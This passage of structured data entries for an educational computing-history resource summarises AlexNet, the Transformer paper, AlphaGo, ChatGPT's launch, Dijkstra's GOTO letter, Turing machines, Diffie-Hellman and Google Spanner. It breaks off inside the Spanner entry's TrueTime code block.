 tldr: "A convolutional network trained on two consumer graphics cards won the 2012 ImageNet competition with a top-5 error of 15.3%, against 26.2% for the next best entry. Nothing in it was conceptually new — CNNs dated to the 1980s. What was new was enough labelled data, enough GPU compute, and a handful of training tricks. The field changed direction within a year.",
 say: [
  "The margin is the story: about 10 percentage points better than second place, in a competition usually won by fractions.",
  "The ideas were old — LeCun had convolutional nets working on cheques in the 1990s. What changed was ImageNet plus two GTX 580s.",
  "It is the canonical example of the bitter lesson: general methods plus compute beat hand-engineered features.",
  "It is also why NVIDIA is worth what it is worth — that afternoon started the GPU-for-AI trajectory."
 ],
 b: [
  { h: "Before" },
  { p: "Computer vision in 2011 was a discipline of hand-designed features. You built SIFT or HOG descriptors, encoded them, and fed the result to a classifier such as an SVM. Progress came from cleverer features designed by researchers who understood images. Neural networks were a minority interest, widely regarded as an idea that had been tried and had underdelivered." },
  { p: "Two things had quietly changed. Fei-Fei Li's group had built **ImageNet** — around 1.2 million labelled training images across 1,000 categories, an order of magnitude beyond what was previously available. And GPUs had become programmable general-purpose processors through CUDA." },

  { h: "The result" },
  { p: "Alex Krizhevsky, Ilya Sutskever and Geoffrey Hinton entered the 2012 ImageNet Large Scale Visual Recognition Challenge with a deep convolutional network of eight learned layers and around 60 million parameters." },
  { l: [
   "**AlexNet top-5 error: 15.3%.** Second place, using conventional methods: 26.2%.",
   "Trained on two NVIDIA GTX 580 cards with 3GB each — consumer gaming hardware — for roughly five to six days.",
   "The network was split across the two GPUs because it did not fit on one, an implementation constraint that shows up in the architecture diagram."
  ] },
  { n: "In a benchmark where the year's winner typically improved on the last by a point or two, a ten-point jump was not an incremental result. It was immediately obvious to everyone in the room that the approach was different in kind, and the following year's competition was dominated by deep networks.",
    nt: "Why the margin mattered more than the number" },

  { h: "What was actually new" },
  { p: "Very little, individually. The contribution was the combination, and the engineering to make it train at all." },
  { l: [
   "**ReLU activations** instead of tanh or sigmoid. Non-saturating, so gradients survive depth, and several times faster to train.",
   "**Dropout** in the fully connected layers — randomly zeroing units during training to prevent co-adaptation. With 60 million parameters and 1.2 million images, overfitting was the binding constraint.",
   "**Data augmentation** — random crops, horizontal flips and colour jitter, multiplying the effective dataset for free.",
   "**GPU training**, hand-written in CUDA, which is what made a network this size trainable in days rather than months.",
   "**Overlapping max pooling** and local response normalisation, the latter of which was subsequently dropped by nearly everyone."
  ] },
  { p: "The convolutional architecture itself came from Yann LeCun's work in the late 1980s and 1990s, which had been reading handwritten cheques commercially for years. The theory was not the bottleneck. Data and compute were." },

  { h: "What followed" },
  { p: "The pivot was fast. By 2013 the competition was almost entirely deep learning; by 2015, ResNet's 152 layers reached 3.6% top-5 error, below typical human performance on the task. Feature engineering as a research programme largely ended in vision." },
  { p: "Three consequences reach beyond vision:" },
  { l: [
   "**Transfer learning became routine.** A network trained on ImageNet learned general visual features in its early layers, so anyone could fine-tune it on a few thousand domain images. This is why small teams can do vision at all.",
   "**GPUs became AI infrastructure.** NVIDIA's decision to invest in CUDA and then in AI-specific hardware traces directly to this period.",
   "**The bitter lesson.** Rich Sutton's later essay argues that general methods leveraging computation consistently beat approaches encoding human knowledge about the domain. AlexNet is the canonical example, and the same argument would repeat with transformers."
  ] }
 ],
 k: [
  "The ideas were decades old; data and compute were the binding constraints.",
  "A large margin on a benchmark is a stronger signal than a small improvement, because it indicates a different approach rather than better tuning.",
  "Pretrained features transfer, which is what made deep learning accessible outside large labs.",
  "General methods plus compute have repeatedly beaten hand-engineered domain knowledge."
 ],
 r: ["Convolutional Neural Network", "ImageNet", "ReLU", "Dropout", "Data Augmentation", "GPU", "Transfer Learning", "Overfitting"],
 src: [
  { t: "Krizhevsky, Sutskever & Hinton — ImageNet Classification with Deep Convolutional Neural Networks (NeurIPS 2012)", u: "https://papers.nips.cc/paper_files/paper/2012/hash/c399862d3b9d6b76c8436e924a68c45b-Abstract.html" },
  { t: "Rich Sutton — The Bitter Lesson (2019)", u: "http://www.incompleteideas.net/IncIdeas/BitterLesson.html" }
 ]
},

{
 t: "Attention Is All You Need",
 s: "The paper that removed recurrence",
 y: 2017, when: "June 2017",
 g: ["transformer", "attention", "parallelism", "nlp"],
 tldr: "Eight researchers at Google published an architecture for machine translation that discarded recurrence and convolution entirely, using only attention and feed-forward layers. The practical consequence was that a sequence model could finally be trained in parallel across its whole length rather than one step at a time — which is what made training on thousands of GPUs worthwhile, and therefore made everything that followed possible.",
 say: [
  "The point is not that attention is smarter than recurrence — it is that attention parallelises and recurrence does not.",
  "An RNN has to process token 1 before token 2; a transformer sees the whole sequence at once, so you can actually saturate a GPU cluster.",
  "It was written as a translation paper. The authors did not frame it as a general architecture for everything.",
  "BERT, GPT, vision transformers and AlphaFold's attention modules all descend from it — it is the substrate of the current era."
 ],
 b: [
  { h: "The bottleneck it removed" },
  { p: "Sequence models before 2017 were recurrent. An LSTM processes a sentence one token at a time, carrying a hidden state forward. That creates two problems." },
  { l: [
   "**No parallelism along the sequence.** Step 50 depends on step 49. A GPU with thousands of cores sits mostly idle while a sentence is processed serially, so throwing hardware at training helps far less than it should.",
   "**Long-range dependencies degrade.** Information from token 3 reaching token 300 must survive 297 successive transformations. LSTMs mitigated this with gating; they did not solve it."
  ] },
  { p: "Attention had already been added to recurrent encoder-decoder models in 2014 and 2015, letting the decoder look back at any encoder position rather than relying on a single fixed summary vector. It worked well. The 2017 paper's move was to notice that if attention was doing the useful work, the recurrence could simply be deleted." },

  { h: "What the architecture does" },
  { p: "Self-attention computes, for every token, a weighted combination of every other token in the sequence. The weights come from learned query, key and value projections: each token emits a query describing what it is looking for, every token emits a key describing what it offers, and the match between them decides how much of each token's value is mixed in." },
  { l: [
   "Every position attends to every other position **in one operation**, so the path length between any two tokens is constant rather than proportional to their distance.",
   "The whole thing is matrix multiplication, which is exactly what GPUs are built for.",
   "**Multi-head attention** runs several attention operations in parallel with different projections, so different heads can specialise — some track syntax, some track coreference.",
   "Because there is no recurrence, the model has no inherent notion of order, so **positional encodings** are added to the input embeddings to supply it."
  ] },
  { n: "The cost is that attention is quadratic in sequence length: doubling the context quadruples the computation. Recurrence was linear. The trade was accepted because parallelism mattered more than asymptotics at the sequence lengths of 2017 — and the entire subsequent industry of long-context techniques, from sparse attention to FlashAttention, exists to manage that quadratic term.",
    nt: "The tradeoff they accepted" },

  { h: "How far it travelled" },
  { p: "The paper reported state-of-the-art results on English-to-German and English-to-French translation at a fraction of the training cost of the previous best models. That alone would have been a good paper. What happened next was disproportionate." },
  { tl: [
    { t: "2018", d: "BERT uses the encoder stack with masked-language pretraining and resets the state of the art across most NLP benchmarks. GPT uses the decoder stack for generative pretraining." },
    { t: "2019–2020", d: "GPT-2 and GPT-3 scale the decoder-only architecture, and scaling laws suggest performance improves predictably with parameters, data and compute." },
    { t: "2020–2021", d: "Vision Transformers apply the same architecture to image patches and match or beat convolutional networks. AlphaFold 2 uses attention for protein structure." },
    { t: "2022 onwards", d: "Essentially all frontier models — language, image, audio, multimodal — are transformer-based." }
  ] },
  { p: "The reason it generalised is that self-attention makes very few assumptions about its input. A convolution assumes spatial locality; a recurrent net assumes sequential order. Attention assumes only that the input is a set of things that might relate to each other. Give it image patches, amino acids or audio frames and the machinery is unchanged." },
  { n: "This is the bitter lesson again. Convolutions encode a genuinely true fact about images — nearby pixels are related — and that inductive bias helps enormously when data is limited. With enough data, a model that assumes less and learns the structure from scratch wins. Vision transformers underperform CNNs on small datasets and beat them on large ones.",
    nt: "Fewer assumptions, more data" }
 ],
 k: [
  "The breakthrough was parallelism, not intelligence — attention lets you use the hardware you already have.",
  "Constant path length between any two positions is what fixed long-range dependencies.",
  "Attention is quadratic in sequence length, which is the constraint the whole long-context field works around.",
  "It generalised because it assumes almost nothing about the input beyond it being a set of related elements."
 ],
 r: ["Transformer", "Attention Mechanism", "Self-Attention", "Positional Encoding", "Recurrent Neural Network", "BERT", "GPT", "Large Language Model"],
 src: [
  { t: "Vaswani et al. — Attention Is All You Need (NeurIPS 2017)", u: "https://arxiv.org/abs/1706.03762" },
  { t: "Jay Alammar — The Illustrated Transformer", u: "https://jalammar.github.io/illustrated-transformer/" }
 ]
},

{
 t: "AlphaGo's Move 37",
 s: "The move no human would have played",
 y: 2016, when: "March 2016",
 g: ["reinforcement learning", "search", "self-play", "deepmind"],
 tldr: "Go was expected to resist computers for another decade because its branching factor defeats brute-force search and positions are notoriously hard to evaluate. In March 2016 AlphaGo beat Lee Sedol 4–1 in Seoul. In game two it played a move on the fifth line that professional commentators initially called a mistake; AlphaGo estimated the chance a human would play it at about one in ten thousand. It won the game, and the move is now studied.",
 say: [
  "Go was considered a decade away because the search space is astronomically larger than chess and positions resist evaluation.",
  "The combination was policy and value networks guiding Monte Carlo tree search — learned intuition narrowing the search, not brute force.",
  "Move 37 is the famous one because it was genuinely novel, not just strong — professionals thought it was an error until it wasn't.",
  "Lee Sedol won game four with his own brilliant move, and later retired citing AI as a reason."
 ],
 b: [
  { h: "Why Go was hard" },
  { p: "Deep Blue beat Kasparov at chess in 1997 largely through search: evaluate enormous numbers of positions with a hand-crafted evaluation function. That approach does not transfer to Go." },
  { l: [
   "Chess has roughly 35 legal moves per position; Go has around 250, over a game roughly twice as long. The search tree is vastly larger.",
   "Chess positions can be evaluated tolerably by counting material. In Go, all stones are identical and value comes from shape, influence and territory that may not resolve for a hundred moves.",
   "Professional players describe much of their judgement as intuition — recognising that a position *feels* strong without being able to enumerate why."
  ] },
  { p: "Before AlphaGo, the strongest programs used Monte Carlo tree search with random playouts and were around strong amateur level. The consensus estimate for professional-level play was a decade or more away." },

  { h: "What DeepMind built" },
  { p: "AlphaGo combined learned evaluation with search rather than replacing one with the other." },
  { l: [
   "A **policy network**, trained first on around 30 million positions from human games, predicting which move a strong player would make. This narrows the search from 250 candidate moves to a handful worth considering.",
   "A **value network**, predicting the probability of winning from a given position — supplying the positional judgement that hand-crafted evaluation could not.",
   "**Monte Carlo tree search**, using both networks to decide where to spend search effort, so it explores deeply along promising lines rather than uniformly.",
   "**Self-play reinforcement learning**, improving the networks by playing against versions of itself, beyond what the human game corpus could teach."
  ] },

  { h: "Seoul, March 2016" },
  { tl: [
    { t: "Game 1", d: "AlphaGo wins. Lee Sedol, who had predicted a 5–0 or 4–1 victory for himself, is visibly surprised." },
    { t: "Game 2, move 37", d: "AlphaGo plays a shoulder hit on the fifth line. Commentators assume a mistake — the move violates conventional opening principles. It proves decisive far later in the game. AlphaGo wins." },
    { t: "Game 3", d: "AlphaGo wins, taking the match 3–0." },
    { t: "Game 4, move 78", d: "Lee plays a wedge later called the *God move*. AlphaGo's evaluation degrades sharply and it plays several weak moves. Lee wins — the only human victory against this version." },
    { t: "Game 5", d: "AlphaGo wins. Final score 4–1." }
  ] },
  { q: "I thought AlphaGo was based on probability calculation and it was merely a machine. But when I saw this move I changed my mind. Surely AlphaGo is creative.", by: "Lee Sedol, on move 37" },
  { n: "AlphaGo's own estimate was that a human player would choose move 37 with probability around 1 in 10,000. It played it because its value network judged the resulting position favourably, not because it resembled anything in the human corpus. This is what made it philosophically interesting: it was not imitating strong play, it had found something outside it.",
    nt: "One in ten thousand" },

  { h: "What came after" },
  { p: "**AlphaGo Zero** (2017) removed human games entirely, learning from self-play alone starting from the rules. It surpassed the version that beat Lee Sedol within days and was stronger than every previous version. Removing the human data made it better — the human corpus had been a floor and also a ceiling." },
  { p: "**AlphaZero** generalised the same method to chess and shogi, and its chess play was described by grandmasters as strikingly different from engine play — willing to sacrifice material for long-term positional advantage in ways conventional engines would not evaluate favourably." },
  { p: "The Go community absorbed the lessons rather than retreating. Opening theory changed; moves previously considered bad were re-examined and adopted. Professional players train against AI, and the general standard of play has risen." },
  { p: "Lee Sedol retired from professional play in 2019, saying that with AI as an entity that cannot be defeated, he no longer saw himself as reaching the top even if he became the best human player." }
 ],
 k: [
  "Learned evaluation narrows a search space that brute force cannot cover.",
  "Self-play removes the ceiling imposed by imitating human data — and removing human data entirely made it stronger.",
  "Novel-but-correct output is what makes a system feel creative rather than merely strong.",
  "Superhuman at one task says nothing about generality — AlphaGo could not play anything else."
 ],
 r: ["Reinforcement Learning", "Monte Carlo Method", "Neural Network", "Self-Supervised Learning", "Markov Decision Process", "Overfitting", "Gradient Descent"],
 src: [
  { t: "Silver et al. — Mastering the game of Go with deep neural networks and tree search, Nature (2016)", u: "https://www.nature.com/articles/nature16961" },
  { t: "AlphaGo — DeepMind", u: "https://deepmind.google/research/breakthroughs/alphago/" }
 ]
},

{
 t: "The ChatGPT Moment",
 s: "The interface was the breakthrough",
 y: 2022, when: "30 November 2022",
 g: ["llm", "product", "rlhf", "adoption"],
 tldr: "OpenAI released a chat interface to a fine-tuned GPT-3.5 as what it described as a low-key research preview. It reached roughly a million users in five days and around a hundred million monthly users in two months. The underlying model was not new — GPT-3 had been available through an API since 2020. What changed was instruction tuning, a conversational interface and free access, which turned a capability that already existed into something anyone could use.",
 say: [
  "The model wasn't new — GPT-3 had been public for two years. The chat interface and RLHF tuning were what changed.",
  "It is the clearest recent example of distribution and interface mattering more than raw capability.",
  "The term for the gap is capability overhang: the ability existed and nobody had packaged it usably.",
  "It triggered a genuine strategic scramble — Google declared an internal code red within weeks."
 ],
 b: [
  { h: "What already existed" },
  { p: "GPT-3 was announced in mid-2020 and available through an API. It could already write code, summarise, translate and hold a conversation of sorts. It was used by developers, startups and researchers, and it was largely invisible to everyone else." },
  { p: "The problem was that a raw language model is a text completer, not an assistant. Given *write me an email to my landlord*, a base model might continue with a list of similar requests, because that is a plausible continuation of that text. Getting useful behaviour required prompt engineering — few-shot examples, careful framing, and a mental model of what the thing actually does." },

  { h: "What changed" },
  { l: [
   "**Instruction tuning and RLHF.** InstructGPT, published in early 2022, fine-tuned the model on demonstrations of following instructions, then used reinforcement learning from human feedback to prefer helpful answers. This converts a completer into something that responds to requests.",
   "**A chat interface.** Turn-taking, conversation history, and a text box. No API key, no parameters, no system prompt to design. The interaction model was one everyone already understood from messaging.",
   "**Free and public.** No waiting list, no cost, no approval process.",
   "**Refusals and guardrails**, which made a public release defensible in a way that a raw base model would not have been."
  ] },
  { n: "None of this increased what the model could do. GPT-3.5 was an incremental improvement on GPT-3 at best. The step change was in what people could *get it to do*, which turns out to be a completely different quantity — and one that engineering culture systematically underweights.",
    nt: "Capability versus accessibility" },

  { h: "The adoption curve" },
  { tl: [
    { t: "30 Nov 2022", d: "Released as a research preview. OpenAI staff have described internal expectations as modest." },
    { t: "5 Dec 2022", d: "Over one million users." },
    { t: "Dec 2022", d: "Google reportedly declares an internal code red over the threat to search." },
    { t: "Jan 2023", d: "Estimated around 100 million monthly active users — reported at the time as the fastest-growing consumer application on record." },
    { t: "Feb–Mar 2023", d: "Microsoft integrates the technology into Bing; Google announces Bard; GPT-4 is released." },
    { t: "Through 2023", d: "*Prompt engineering* enters general vocabulary; enterprise AI strategy becomes a board-level topic almost universally." }
  ] },

  { h: "What engineers should take from it" },
  { l: [
   "**Capability overhang is real.** There is usually a gap between what a technology can do and what anyone has packaged it to do. That gap is a product problem, and it can be worth more than years of capability research.",
   "**The interface is not a wrapper.** *It is just a UI on an API* was a common dismissal at the time, and it was exactly backwards. The interface was the innovation.",
   "**Fluency is not accuracy.** RLHF optimises for responses humans rate highly, which correlates with being helpful and also with sounding confident. Confident wrong answers are a direct consequence of the training objective, not an incidental bug.",
   "**Distribution compounds.** Free public access generated the usage data and the feedback loop that improved subsequent models, which is a durable advantage that capability alone does not confer."
  ] },
  { p: "The historical parallel usually drawn is the graphical user interface. Everything Xerox PARC demonstrated existed before the Macintosh shipped; the machine that made it usable is the one that changed the industry. Whether that comparison holds is still being argued, which is itself a reasonable thing to say about it." }
 ],
 k: [
  "The capability existed for two years; the interface is what created the adoption.",
  "RLHF converted a text completer into something that follows instructions — that is the technical change.",
  "Optimising for responses humans rate well produces confident answers, correct or not.",
  "Free public distribution creates a data feedback loop that capability alone does not."
 ],
 r: ["Large Language Model", "GPT", "RLHF", "Fine-Tuning", "Prompt Engineering", "Hallucination", "Instruction Tuning", "Transformer"],
 src: [
  { t: "OpenAI — Introducing ChatGPT (November 2022)", u: "https://openai.com/index/chatgpt/" },
  { t: "Ouyang et al. — Training language models to follow instructions with human feedback (InstructGPT, 2022)", u: "https://arxiv.org/abs/2203.02155" }
 ]
},

{
 t: "Dijkstra's 'Go To Statement Considered Harmful'",
 s: "The letter that changed how we write code",
 y: 1968, when: "March 1968",
 g: ["structured programming", "control flow", "cs theory", "dijkstra"],
 tldr: "Edsger Dijkstra wrote a short letter to the editor of Communications of the ACM arguing that the GOTO statement should be abolished from high-level programming languages because it made programs nearly impossible to reason about. The letter ignited a decade-long debate, but its position won: structured programming — using only sequence, selection and iteration — became the default, and GOTO effectively vanished from mainstream practice. The phrase 'considered harmful' became a genre of its own.",
 say: [
  "The argument: GOTO lets execution jump anywhere, which means the relationship between the program text and the program's state at any point becomes intractable.",
  "Structured programming replaced it with three constructs: sequence, selection (if/else), and iteration (while/for). These are sufficient for any computation.",
  "The phrase 'considered harmful' has been applied to everything from semicolons to microservices — it became a meme before memes existed.",
  "Dijkstra did not actually title the letter that. The editor, Niklaus Wirth, changed 'A Case Against the GO TO Statement' to the more provocative title."
 ],
 b: [
  { h: "The problem with GOTO" },
  { p: "In the 1960s, most programming was done in assembly or in early high-level languages where GOTO was the primary control flow mechanism. A program was a sequence of labelled statements, and GOTO could jump to any label — forward, backward, into or out of loops." },
  { p: "Dijkstra's observation was precise: the quality of a programmer's reasoning about a program depends on the relationship between the static text of the program and the dynamic process it generates. With structured control flow, you can point at a line and know roughly where you are in the computation. With unrestricted GOTO, you cannot, because execution could have arrived from anywhere." },
  { q: "The go to statement as it stands is just too primitive; it is too much an invitation to make a mess of one's program.", by: "Edsger Dijkstra, Go To Statement Considered Harmful (1968)" },

  { h: "The structured programming theorem" },
  { p: "Böhm and Jacopini had already proved in 1966 that any program using GOTO can be rewritten using only three structures:" },
  { l: [
   "**Sequence** — execute statements in order.",
   "**Selection** — if/else branching.",
   "**Iteration** — while/for loops."
  ] },
  { p: "These three are sufficient to express any computable function. Dijkstra's argument was not just that GOTO was unnecessary, but that it was actively harmful — it invited error by making the relationship between code and computation opaque." },
  { n: "The debate was fierce. Donald Knuth wrote a nuanced response in 1974 ('Structured Programming with go to Statements') arguing that some uses of GOTO produced clearer code than the structured alternatives — particularly for error handling and breaking out of nested loops. Most modern languages settled this by providing constrained jumps: break, continue, return, and exceptions. These are GOTOs with restrictions that preserve the ability to reason about control flow.",
    nt: "Knuth's counterpoint" },

  { h: "What it changed" },
  { l: [
   "Structured programming became the default paradigm. New languages (Pascal, C, and every language since) were designed around structured control flow.",
   "Code became reasonably analysable — you can trace execution through a structured program without considering every possible jump.",
   "The principle extends: the argument against GOTO generalises to any construct that makes it hard to relate the text of a program to its execution. Unrestricted mutation, callback hell and deeply nested conditionals are all the same category of problem.",
   "The title format 'X Considered Harmful' became the most imitated pattern in computer science writing."
  ] }
 ],
 k: [
  "The ability to reason about a program depends on the relationship between the static text and the dynamic execution.",
  "Sequence, selection and iteration are sufficient for any computation — GOTO adds power that makes programs harder to understand without enabling anything new.",
  "Constrained jumps (break, continue, return, exceptions) are the compromise: they allow necessary escapes without destroying structure.",
  "The principle generalises: any construct that breaks the text-to-execution mapping makes programs harder to verify."
 ],
 r: ["Algorithm", "Recursion", "Compiler", "Code Review", "Refactoring", "Formal Verification"],
 src: [
  { t: "Dijkstra — Go To Statement Considered Harmful, Communications of the ACM (1968)", u: "https://homepages.cwi.nl/~storm/teaching/reader/Dijkstra68.pdf" },
  { t: "Knuth — Structured Programming with go to Statements (1974)", u: "https://dl.acm.org/doi/10.1145/356635.356640" }
 ]
},

{
 t: "The Turing Machine",
 s: "The theoretical foundation of all computation",
 y: 1936, when: "1936",
 g: ["computability", "theory", "halting problem", "turing"],
 tldr: "Alan Turing, a 23-year-old Cambridge mathematician, described an abstract machine — a tape, a head, a state table — and proved that some problems are fundamentally unsolvable by any mechanical process. The machine was a thought experiment to resolve a question in mathematical logic, but it turned out to define what computation itself means. Every computer ever built, from mainframes to smartphones to GPUs, is equivalent to Turing's imaginary machine.",
 say: [
  "A Turing machine is absurdly simple: an infinite tape, a read/write head, a finite set of states, and a transition table. That is provably enough for any computation.",
  "The halting problem is the famous result: you cannot write a program that decides, for all programs, whether they will finish or run forever.",
  "The Church-Turing thesis says anything that can be computed by any physical process can be computed by a Turing machine. It is an empirical claim, not a theorem, and nothing has contradicted it.",
  "Turing was 23 when he wrote the paper, which also happened to define the theoretical basis for the computer science degree you are studying."
 ],
 b: [
  { h: "The question" },
  { p: "David Hilbert had posed the *Entscheidungsproblem* (decision problem): is there a mechanical procedure that can determine the truth or falsehood of any mathematical statement? Turing needed to define what 'mechanical procedure' meant before he could answer, so he invented the machine." },

  { h: "The machine" },
  { p: "A Turing machine consists of:" },
  { l: [
   "**An infinite tape** divided into cells, each containing a symbol from a finite alphabet.",
   "**A head** that reads and writes symbols on the tape and moves left or right, one cell at a time.",
   "**A state register** holding the current state, from a finite set.",
   "**A transition function** that, given the current state and the symbol under the head, specifies: the symbol to write, the direction to move, and the next state."
  ] },
  { x: { lang: "text", code:
"Example: A machine that adds 1 to a binary number\n\nTape:  ... _ 1 0 1 1 _ ...\n                     ^\n                   head\n\nState   Read   Write   Move   Next State\nSTART   1      0       Left   CARRY\nSTART   0      1       Left   DONE\nCARRY   1      0       Left   CARRY\nCARRY   0      1       Left   DONE\nCARRY   _      1       Left   DONE\n\nResult: ... _ 1 1 0 0 _ ..." } },
  { p: "This is not meant to be practical. It is meant to capture the essence of what computation is, stripped to the absolute minimum. Every programming language, every CPU architecture, every model of computation anyone has ever proposed turns out to compute exactly the same class of functions as this machine." },

  { h: "The halting problem" },
  { p: "Turing proved that there exists no Turing machine H that can correctly decide, for every machine M and input I, whether M halts on I. The proof is a diagonal argument:" },
  { l: [
   "Assume H(M, I) exists and correctly returns HALTS or LOOPS for any M and I.",
   "Construct a new machine D that, given M, runs H(M, M) — feeding the machine its own description as input.",
   "If H says M halts on itself, D loops forever. If H says M loops on itself, D halts.",
   "Now run D on itself: D(D). If H says D halts, D loops. If H says D loops, D halts. Contradiction."
  ] },
  { n: "The halting problem is not an engineering limitation — it is a mathematical impossibility. No amount of compute, no cleverer algorithm, no future technology can solve it in general. It means there are questions about programs that no program can answer. This is why your compiler can catch syntax errors but cannot tell you whether your code will terminate.",
    nt: "Not hard — impossible" },

  { h: "Why it matters for your degree" },
  { l: [
   "**Computability theory.** The classes of problems that can and cannot be solved by any algorithm are defined relative to Turing machines.",
   "**Complexity theory.** P, NP, NP-completeness — all defined in terms of Turing machine time and space.",
   "**The Church-Turing thesis.** Any reasonable model of computation (lambda calculus, register machines, cellular automata, your laptop) computes the same class of functions.",
   "**Practical undecidability.** Rice's theorem generalises the halting problem: no non-trivial property of a program's behaviour can be decided in general. Perfect static analysis is mathematically impossible.",
   "**Universal Turing machine.** Turing also described a machine that takes the description of any other machine as input and simulates it — the theoretical basis of the stored-program computer and the interpreter."
  ] }
 ],
 k: [
  "A Turing machine defines computation: an infinite tape, a head, a finite state table. That is provably enough.",
  "The halting problem is undecidable — no program can decide for all programs whether they terminate.",
  "The Church-Turing thesis: everything physically computable is Turing-computable. No counterexample exists.",
  "Rice's theorem: no non-trivial semantic property of programs is decidable in general."
 ],
 r: ["Algorithm", "Time Complexity", "Big O Notation", "Recursion", "Compiler", "Formal Verification"],
 src: [
  { t: "Turing — On Computable Numbers, with an Application to the Entscheidungsproblem (1936)", u: "https://www.cs.virginia.edu/~robins/Turing_Paper_1936.pdf" }
 ]
},

{
 t: "Diffie-Hellman Key Exchange",
 s: "Public-key cryptography was born here",
 y: 1976, when: "1976",
 g: ["cryptography", "key exchange", "public key", "mathematics"],
 tldr: "Whitfield Diffie and Martin Hellman published a paper describing how two people could agree on a shared secret over a public channel without ever having met. The mathematical trick — modular exponentiation where the forward operation is easy but the inverse (discrete logarithm) is computationally infeasible — broke the fundamental assumption that secret communication required a pre-shared key. HTTPS, SSH, TLS, VPNs and every secure channel on the internet descend from this idea.",
 say: [
  "Before 1976, encryption required both parties to already share a secret key. The key distribution problem was the bottleneck — how do you get the key there securely?",
  "Diffie-Hellman solved it: two parties can compute a shared secret by exchanging public values, and an eavesdropper who sees everything cannot derive the secret.",
  "The mathematical basis is that modular exponentiation is easy to compute but the discrete logarithm is believed to be computationally infeasible.",
  "It underpins HTTPS, SSH, TLS and essentially every secure communication channel on the internet."
 ],
 b: [
  { h: "The key distribution problem" },
  { p: "Symmetric encryption — where the same key encrypts and decrypts — has been used for thousands of years. The fundamental problem is always the same: both parties need the key. If they could meet in person, they could exchange it. But if they were communicating over a distance — or had never met — how do they establish a shared secret without an eavesdropper learning it?" },
  { p: "Diffie and Hellman's breakthrough was showing that this was solvable mathematically, without a trusted courier." },

  { h: "How it works" },
  { p: "The mechanism relies on a one-way function: modular exponentiation." },
  { x: { lang: "text", code:
"Public parameters: a prime p and a generator g\n\nAlice:                         Bob:\n  Picks secret a                 Picks secret b\n  Computes A = g^a mod p         Computes B = g^b mod p\n  Sends A to Bob ───────────►\n                    ◄──────────── Sends B to Alice\n  Computes s = B^a mod p         Computes s = A^b mod p\n\nBoth compute: s = g^(ab) mod p\n\nEve sees: p, g, A, B\nTo find s, she needs a or b\nThat requires computing the discrete logarithm\nWhich is (believed to be) computationally infeasible" } },
  { l: [
   "**Forward direction (easy).** Computing g^a mod p is efficient even for very large numbers — square-and-multiply takes O(log a) multiplications.",
   "**Reverse direction (hard).** Given g^a mod p, finding a requires solving the discrete logarithm problem, for which no efficient classical algorithm is known.",
   "**The shared secret.** Alice computes B^a = (g^b)^a = g^(ab) mod p. Bob computes A^b = (g^a)^b = g^(ab) mod p. They arrive at the same value without either transmitting their secret."
  ] },
  { n: "This is the mathematical foundation of HTTPS. When your browser connects to a website, a variant of Diffie-Hellman (usually ECDHE — Elliptic Curve Diffie-Hellman Ephemeral) runs to establish a session key. That key encrypts the connection. The server's certificate proves identity (via RSA or ECDSA), but the session key comes from Diffie-Hellman. This is why forward secrecy works: even if the server's private key is later compromised, past session keys cannot be recovered because they were ephemeral.",
    nt: "This runs every time you open HTTPS" },

  { h: "What followed" },
  { tl: [
    { t: "1976", d: "Diffie and Hellman publish 'New Directions in Cryptography'." },
    { t: "1977", d: "Rivest, Shamir and Adleman publish RSA — the first practical public-key encryption system." },
    { t: "1985", d: "Elliptic curve cryptography proposed (Miller, Koblitz), enabling the same security with smaller keys." },
    { t: "1994", d: "SSL (later TLS) makes HTTPS possible, using DH for key exchange." },
    { t: "1997", d: "GCHQ declassifies that James Ellis and Clifford Cocks had independently discovered public-key cryptography in 1970–1973, but it remained classified." }
  ] },

  { h: "For your CS courses" },
  { l: [
   "**Number theory matters.** Modular arithmetic, prime numbers, group theory — this is where they have direct engineering impact.",
   "**Computational hardness is a feature.** The security relies on the assumed difficulty of the discrete logarithm. If someone finds an efficient algorithm, the system breaks.",
   "**Quantum threat.** Shor's algorithm can solve discrete logarithms efficiently on a quantum computer. Post-quantum cryptography research is developing alternatives that resist quantum attacks.",
   "**Perfect forward secrecy.** Using ephemeral DH keys per session means compromising a long-term key does not unlock past traffic."
  ] }
 ],
 k: [
  "Key exchange over a public channel is possible because modular exponentiation is easy but the discrete logarithm is hard.",
  "Diffie-Hellman solved the key distribution problem that had constrained cryptography for millennia.",
  "HTTPS, SSH and TLS all use DH variants for session key establishment.",
  "Quantum computers threaten DH — post-quantum alternatives are being standardised now."
 ],
 r: ["Public-Key Cryptography", "Encryption", "TLS", "SSH", "Hashing", "Authentication"],
 src: [
  { t: "Diffie & Hellman — New Directions in Cryptography, IEEE (1976)", u: "https://ieeexplore.ieee.org/document/1055638" }
 ]
},

{
 t: "Google Spanner",
 s: "Globally consistent, and they synchronised the clocks",
 y: 2012, when: "2012",
 g: ["distributed database", "consistency", "truetime", "google"],
 tldr: "Google built Spanner, a globally distributed database that provides external consistency — the strongest guarantee available — across data centres on different continents. The conventional wisdom, informed by the CAP theorem, was that you had to choose between consistency and availability at global scale. Spanner challenged that by using synchronised atomic clocks and GPS receivers to bound clock uncertainty, turning a distributed systems problem into a hardware problem. It is the database behind Google's most critical services.",
 say: [
  "Spanner is externally consistent at global scale — transactions are serialisable and real-time ordered across continents.",
  "The trick is TrueTime: atomic clocks and GPS in every data centre give a bounded uncertainty interval for the current time.",
  "Commits wait out the uncertainty interval before becoming visible, which guarantees ordering. The cost is latency proportional to clock uncertainty.",
  "It challenged the practical interpretation of CAP: you can have strong consistency at global scale if you invest enough in clock infrastructure."
 ],
 b: [
  { h: "The problem" },
  { p: "Google needed a database for critical systems (AdWords, Google Play) that was globally distributed for latency and availability, yet provided strong transactional guarantees. The existing options required choosing:" },
  { l: [
   "**Strong consistency, single region.** Traditional databases provide serialisable transactions but do not span continents.",
   "**Global distribution, weak consistency.** Dynamo-style systems span regions but offer only eventual consistency.",
   "**Spanner's claim.** Strong consistency at global scale. The cost is paid in latency (commit delays) and infrastructure (atomic clocks)."
  ] },

  { h: "TrueTime" },
  { p: "The fundamental problem in distributed systems is that clocks on different machines drift. You cannot determine the order of events on different machines by comparing timestamps if the clocks might be wrong." },
  { p: "Google's solution was hardware. Every Spanner data centre has redundant atomic clocks and GPS receivers. The TrueTime API does not return a timestamp — it returns an interval:" },
  { x: { lang: "text", code:
